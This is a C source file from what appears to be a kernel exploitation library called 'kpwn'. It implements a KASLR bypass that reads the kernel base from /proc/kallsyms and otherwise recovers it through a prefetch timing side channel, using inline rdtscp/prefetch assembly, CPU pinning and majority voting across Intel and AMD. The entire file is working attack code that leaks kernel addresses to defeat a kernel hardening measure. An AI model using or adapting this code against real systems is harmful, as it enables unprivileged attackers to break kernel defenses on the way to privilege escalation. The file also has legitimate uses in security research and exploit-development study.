#define _GNU_SOURCE
#include "prefetch_scan.h"
#include <cpuid.h>
#include <errno.h>
#include <kpwn/logger.h>
#include <kpwn/utils.h>
#include <kpwn/x86_64/side_channel.h>
#include <sched.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define WARMUP_ITERATIONS 3
#define MEASURE_ITERATIONS 64
#define CONFIRM_PASSES 7
#define BATCH_ITERATIONS 10
#define BATCH_PASSES 5
#define BATCH_SIZE 2000

static void collect_timings(uint64_t *times, enum side_channel_arch arch) {
  int amd = arch == x86_64_amd;
  for (size_t idx = 0; idx < PREFETCH_SLOTS; idx++)
    times[idx] = amd ? 0 : UINT64_MAX;
  for (int pass = 0; pass < WARMUP_ITERATIONS + MEASURE_ITERATIONS; pass++) {
    for (size_t idx = 0; idx < PREFETCH_SLOTS; idx++) {
      uint64_t addr = PREFETCH_TEXT_MIN + idx * PREFETCH_ALIGN;
      uint64_t t = measure_prefetch((void *)addr);
      if (pass < WARMUP_ITERATIONS)
        continue;
      if (amd)
        times[idx] += t;
      else if (t < times[idx])
        times[idx] = t;
    }
  }
}

// Batched timer adapted from KASLD's prefetch_scan_time_batch; see
// prefetch_scan.h and LICENSES/KASLD-MIT.txt for provenance and license.
static uint64_t measure_prefetch_batch(uint64_t addr) {
  uint64_t t0_lo, t0_hi, t1_lo, t1_hi;
  unsigned long batch = BATCH_SIZE;
  __asm__ volatile("mfence\n\t"
                   "rdtscp\n\t"
                   "movq %%rax, %0\n\t"
                   "movq %%rdx, %1\n\t"
                   "lfence\n\t"
                   "1:\n\t"
                   "prefetchnta (%5)\n\t"
                   "prefetcht2 (%5)\n\t"
                   "decq %4\n\t"
                   "jnz 1b\n\t"
                   "lfence\n\t"
                   "rdtscp\n\t"
                   "movq %%rax, %2\n\t"
                   "movq %%rdx, %3\n\t"
                   "mfence"
                   : "=&r"(t0_lo), "=&r"(t0_hi), "=&r"(t1_lo), "=&r"(t1_hi),
                     "+r"(batch)
                   : "r"(addr)
                   : "rax", "rcx", "rdx", "cc", "memory");
  return ((t1_hi << 32) | t1_lo) - ((t0_hi << 32) | t0_lo);
}

static void collect_timings_batched(uint64_t *times) {
  for (size_t idx = 0; idx < PREFETCH_SLOTS; idx++) {
    uint64_t addr = PREFETCH_TEXT_MIN + idx * PREFETCH_ALIGN;
    times[idx] = UINT64_MAX;
    // Consecutive trials prevent periodic stalls from affecting a whole band.
    for (int pass = 0; pass < WARMUP_ITERATIONS + BATCH_ITERATIONS; pass++) {
      uint64_t t = measure_prefetch_batch(addr);
      if (pass >= WARMUP_ITERATIONS && t < times[idx])
        times[idx] = t;
    }
  }
}

static size_t scan_prefetch(enum side_channel_arch arch, int batched) {
  uint64_t times[PREFETCH_SLOTS];
  size_t results[CONFIRM_PASSES] = {0};
  int max_passes = batched ? BATCH_PASSES : CONFIRM_PASSES;
  for (int pass = 0; pass < max_passes; pass++) {
    if (batched)
      collect_timings_batched(times);
    else
      collect_timings(times, arch);

    results[pass] = arch == x86_64_amd ? prefetch_find_base_amd(times, batched)
                                       : prefetch_find_base_intel(times);
    log_debug("[kpwn:kaslr] %s pass %d/%d result=0x%lx",
              batched ? "batch" : "single", pass + 1, max_passes,
              results[pass]);
    if (batched && results[pass]) {
      int votes = 0;
      for (int i = 0; i <= pass; i++)
        if (results[i] == results[pass])
          votes++;
      // Require a majority of the full budget, even when exiting early.
      if (votes > max_passes / 2) {
        log_success("[kpwn:kaslr] batch kbase=0x%lx votes=%d/%d", results[pass],
                    votes, max_passes);
        return results[pass];
      }
    }
  }

  struct count_sort_data majority =
      count_sort((const uint64_t *)results, max_passes);
  if (majority.counter > (size_t)max_passes / 2 && majority.data != 0) {
    log_success("[kpwn:kaslr] prefetch kbase=0x%lx votes=%zu/%d", majority.data,
                majority.counter, max_passes);
    return majority.data;
  }
  log_warn("[kpwn:kaslr] prefetch inconclusive (best=0x%lx votes=%zu/%d)",
           majority.data, majority.counter, max_passes);
  return 0;
}

// --- public API --------------------------------------------------------------

size_t kasld_prefetch() {
  enum side_channel_arch arch = get_arch();
  if (arch != x86_64_intel && arch != x86_64_amd) {
    log_error("[kpwn:kaslr] unsupported arch for prefetch");
    return 0;
  }
  unsigned a, b, c, d;
  if (!__get_cpuid(0x80000001, &a, &b, &c, &d) || !(d & (1u << 27))) {
    log_warn("[kpwn:kaslr] RDTSCP is not supported");
    return 0;
  }
  char *cpuinfo = slurp_file("/proc/cpuinfo", 1 << 16);
  int pti = prefetch_kpti_flag(cpuinfo);
  free(cpuinfo);
  if (pti != 0) {
    log_warn("[kpwn:kaslr] %s; skipping prefetch",
             pti > 0 ? "KPTI is enabled" : "cannot determine KPTI status");
    return 0;
  }

  cpu_set_t saved, pinned;
  if (sched_getaffinity(0, sizeof(saved), &saved) != 0) {
    log_warn("[kpwn:kaslr] cannot read CPU affinity: %s", strerror(errno));
    return 0;
  }
  int cpu = sched_getcpu();
  if (cpu < 0 || cpu >= CPU_SETSIZE || !CPU_ISSET(cpu, &saved)) {
    for (cpu = 0; cpu < CPU_SETSIZE && !CPU_ISSET(cpu, &saved); cpu++)
      ;
  }
  if (cpu == CPU_SETSIZE) {
    log_warn("[kpwn:kaslr] no CPU available for prefetch");
    return 0;
  }
  CPU_ZERO(&pinned);
  CPU_SET(cpu, &pinned);
  if (sched_setaffinity(0, sizeof(pinned), &pinned) != 0) {
    log_warn("[kpwn:kaslr] cannot pin CPU: %s", strerror(errno));
    return 0;
  }

  size_t base = scan_prefetch(arch, 0);
  if (!base && arch == x86_64_amd) {
    log_debug("[kpwn:kaslr] retrying AMD with batched prefetch");
    base = scan_prefetch(arch, 1);
  }
  if (sched_setaffinity(0, sizeof(saved), &saved) != 0) {
    log_warn("[kpwn:kaslr] cannot restore CPU affinity: %s", strerror(errno));
    return 0;
  }
  return base;
}

size_t kasld_proc_kallsyms() {
  char *content = slurp_file("/proc/kallsyms", 1 << 20);
  if (!content)
    return 0;

  // Check first few lines for all-zeros (restricted)
  int all_zero = 1;
  char *p = content;
  for (int i = 0; i < 16 && *p; i++) {
    if (*p != '0') {
      all_zero = 0;
      break;
    }
    while (*p && *p != '\n')
      p++;
    if (*p)
      p++;
  }
  if (all_zero) {
    free(content);
    log_debug("[kpwn:kaslr] /proc/kallsyms restricted (all zeros)");
    return 0;
  }

  // Search for _text or _stext
  p = content;
  while (*p) {
    char *nl = strchr(p, '\n');
    if (!nl)
      nl = p + strlen(p);

    char addr_str[20] = {0};
    char type;
    char sym[256] = {0};
    if (sscanf(p, "%19s %c %255s", addr_str, &type, sym) == 3) {
      if ((strcmp(sym, "_text") == 0 || strcmp(sym, "_stext") == 0) &&
          (type == 'T' || type == 't')) {
        uint64_t addr = strtoull(addr_str, NULL, 16);
        if (addr > 0xffff000000000000ull) {
          free(content);
          log_success("[kpwn:kaslr] kallsyms %s=0x%lx", sym, addr);
          return addr;
        }
      }
    }

    if (!*nl)
      break;
    p = nl + 1;
  }

  free(content);
  log_debug("[kpwn:kaslr] /proc/kallsyms: _text not found");
  return 0;
}

size_t kasld() {
  // Strategy 1: /proc/kallsyms (cheapest, but needs perf_event_paranoid<=1)
  size_t base = kasld_proc_kallsyms();
  if (base) {
    log_info("[kpwn:kaslr] method=kallsyms kbase=0x%lx", base);
    return base;
  }

  // Strategy 2: prefetch side-channel (works unprivileged on Intel and AMD)
  base = kasld_prefetch();
  if (base) {
    log_info("[kpwn:kaslr] method=prefetch kbase=0x%lx", base);
    return base;
  }

  log_error("[kpwn:kaslr] all methods failed");
  return 0;
}

// --- legacy API (delegates to kasld_prefetch) --------------------------------

size_t kasld_amd() { return kasld_prefetch(); }
size_t kasld_intel() { return kasld_prefetch(); }

size_t kasld_amd_with_conf(size_t start, size_t end, size_t step,
                           size_t num_confirm, size_t window_size) {
  (void)start;
  (void)end;
  (void)step;
  (void)num_confirm;
  (void)window_size;
  return kasld_prefetch();
}

size_t kasld_intel_with_conf(size_t start, size_t end, size_t step,
                             size_t num_confirm) {
  (void)start;
  (void)end;
  (void)step;
  (void)num_confirm;
  return kasld_prefetch();
}

enum side_channel_arch get_arch() {
  char info[0x10];
  cpuinfo_str(info);

  log_debug("[kpwn:kaslr] cpu vendor=%s", info);

  if (strcmp(info, "GenuineIntel") == 0)
    return x86_64_intel;
  else if (strcmp(info, "AuthenticAMD") == 0)
    return x86_64_amd;

  log_warn("[kpwn:kaslr] unknown vendor: %s", info);
  return unknown_arch;
}
